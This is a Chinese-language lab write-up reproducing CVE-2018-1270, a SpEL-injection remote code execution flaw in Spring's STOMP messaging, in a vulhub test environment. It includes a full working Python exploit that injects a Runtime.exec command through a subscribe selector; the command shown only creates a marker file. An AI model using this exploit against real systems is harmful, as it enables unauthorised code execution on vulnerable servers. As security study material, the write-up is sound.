

# Spring Messaging 远程命令执行漏洞（CVE-2018-1270）

###### by ADummy

### 0x00利用路线

​			订阅的时候插入SpEL表达式--->向此订阅发送消息--->触发命令执行

### 0x01漏洞介绍

​			STOMP（Simple Text Orientated Messaging Protocol）全称为简单文本定向消息协议，它是一种在客户端与中转服务端（消息代理Broker）之间进行异步消息传输的简单通用协议，它定义了服务端与客户端之间的格式化文本传输方式。已经在被许多消息中间件与客户端工具所支持。STOMP协议规范：https://stomp.github.io/stomp-specification-1.0.html

Spring框架中的 **spring-messaging** 模块提供了一种基于WebSocket的STOMP协议实现，STOMP消息代理在处理客户端消息时存在SpEL表达式注入漏洞，攻击者可以通过构造恶意的消息来实现远程代码执行。

​			影响版本

  		SpringFramework 5.0 ~ 5.0.4，4.3 ~ 4.3.14

### 0x02漏洞复现

​	网上大部分文章都说spring messaging是基于websocket通信，其实不然。spring messaging是基于sockjs（可以理解为一个通信协议），而sockjs适配多种浏览器：现代浏览器中使用websocket通信，老式浏览器中使用ajax通信。

连接后端服务器的流程，可以理解为：

1. 用[STOMP协议](http://jmesnil.net/stomp-websocket/doc/)将数据组合成一个文本流
2. 用[sockjs协议](https://github.com/sockjs/sockjs-client)发送文本流，sockjs会选择一个合适的通道：websocket或xhr(http)，与后端通信

所以我们可以使用http来复现漏洞，称之为“降维打击”。

我编写了一个简单的POC脚本[exploit.py](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py)（需要用python3.6执行），因为该漏洞是订阅的时候插入SpEL表达式，而对方向这个订阅发送消息时才会触发，所以我们需要指定的信息有：

1. 基础地址，在vulhub中为`http://your-ip:8080/gs-guide-websocket`
2. 待执行的SpEL表达式，如`T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')`
3. 某一个订阅的地址，如vulhub中为：`/topic/greetings`
4. 如何触发这个订阅，即如何让后端向这个订阅发送消息。在vulhub中，我们向`/app/hello`发送一个包含name的json，即可触发这个事件。当然在实战中就不同了，所以这个poc并不具有通用性。

根据你自己的需求修改POC。如果是vulhub环境，你只需修改1中的url即可。

exp

```
#!/usr/bin/env python3
import requests
import random
import string
import time
import threading
import logging
import sys
import json

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))


class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
        self.daemon = True
        self.session = requests.session()
        self.session.headers = {
            'Referer': url,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        }
        self.t = int(time.time()*1000)

    def run(self):
        url = f'{self.base}/htmlfile?c=_jp.vulhub'
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)
    
    def send(self, command, headers, body=''):
        data = [command.upper(), '\n']

        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))
        
        data.append('\n\n')
        data.append(body)
        data.append('\x00')
        data = json.dumps([''.join(data)])

        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)
        if response.status_code != 204:
            logging.info(f"send '{command}' data error.")
        else:
            logging.info(f"send '{command}' data success.")

    def __del__(self):
        self.session.close()


sockjs = SockJS('http://192.168.0.142:8080/gs-guide-websocket')
sockjs.start()
time.sleep(1)

sockjs.send('connect', {
    'accept-version': '1.1,1.0',
    'heart-beat': '10000,10000'
})
sockjs.send('subscribe', {
    'selector': "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')",
    'id': 'sub-0',
    'destination': '/topic/greetings'
})

data = json.dumps({'name': 'vulhub'})
sockjs.send('send', {
    'content-length': len(data),
    'destination': '/app/hello'
}, data)
```

![Spring_Messaging_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Messaging_RCE_1.jpg)

![Spring_Messaging_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Messaging_RCE_2.jpg)